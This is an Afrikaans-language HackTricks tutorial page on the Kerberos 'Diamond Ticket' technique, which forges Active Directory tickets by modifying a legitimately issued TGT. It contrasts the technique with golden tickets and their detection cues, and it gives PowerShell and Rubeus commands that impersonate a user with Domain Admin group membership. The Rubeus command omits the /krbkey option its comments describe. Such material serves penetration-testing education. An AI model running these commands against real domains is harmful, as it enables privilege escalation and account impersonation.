# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Soos 'n goue kaart**, is 'n diamant kaart 'n TGT wat gebruik kan word om **toegang tot enige diens as enige gebruiker** te verkry. 'n Goue kaart word heeltemal aflyn gesmee, versleuteld met die krbtgt-hash van daardie domein, en dan in 'n aanmeldsessie gebruik. Omdat domeinbeheerders nie TGT's wat hulle wettiglik uitgereik het, volg nie, sal hulle graag TGT's aanvaar wat met sy eie krbtgt-hash versleuteld is.

Daar is twee algemene tegnieke om die gebruik van goue kaarte te ontdek:

* Soek na TGS-REQs wat geen ooreenstemmende AS-REQ het nie.
* Soek na TGT's wat dom waardes het, soos Mimikatz se standaard 10-jaar lewensduur.

'n **Diamant kaart** word gemaak deur **die velde van 'n wettige TGT wat deur 'n DC uitgereik is, te wysig**. Dit word bereik deur **'n TGT aan te vra**, dit **te ontsleutel** met die domein se krbtgt-hash, die gewenste velde van die kaart te **wysig**, en dit dan **weer te versleutel**. Dit **oorkom die twee bogenoemde tekortkominge** van 'n goue kaart omdat:

* TGS-REQs sal 'n voorafgaande AS-REQ hê.
* Die TGT is deur 'n DC uitgereik wat beteken dit sal al die korrekte besonderhede van die domein se Kerberos-beleid hê. Alhoewel hierdie akkuraat in 'n goue kaart gesmee kan word, is dit meer kompleks en vatbaar vir foute.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
